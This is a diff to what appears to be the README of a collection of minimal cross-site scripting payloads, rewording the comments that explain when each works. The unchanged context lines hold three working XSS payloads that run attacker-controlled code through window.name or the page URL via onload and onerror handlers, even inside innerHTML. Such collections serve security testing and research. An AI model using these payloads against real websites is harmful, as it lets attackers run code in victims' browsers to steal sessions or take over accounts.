@@ -21,17 +21,17 @@ The DEMO available here: <https://tinyxss.terjanq.me>
 ```
 
 ```html
-<!-- In chrome, also works inside innerHTML, even for elements not yet inserted into DOM -->
+<!-- In chrome, also works inside innerHTML, even on elements not yet inserted into DOM -->
 <svg><svg/onload=eval(name)>
 ```
 
 ```html
-<!-- If you control window's name, this payload is that it will work inside innerHTML on elements not yet inserted into the DOM -->
+<!-- If you control window's name, this payload will work inside innerHTML, even on elements not yet inserted into the DOM -->
 <audio/src/onerror=eval(name)>
 ```
 
 ```html
-<!-- If you control the URL, this payload is that it will work inside innerHTML on elements not yet inserted into the DOM -->
+<!-- If you control the URL, this payload will work inside innerHTML, even on elements not yet inserted into the DOM -->
 <img/src/onerror=eval(`'`+URL)>
 ```
 
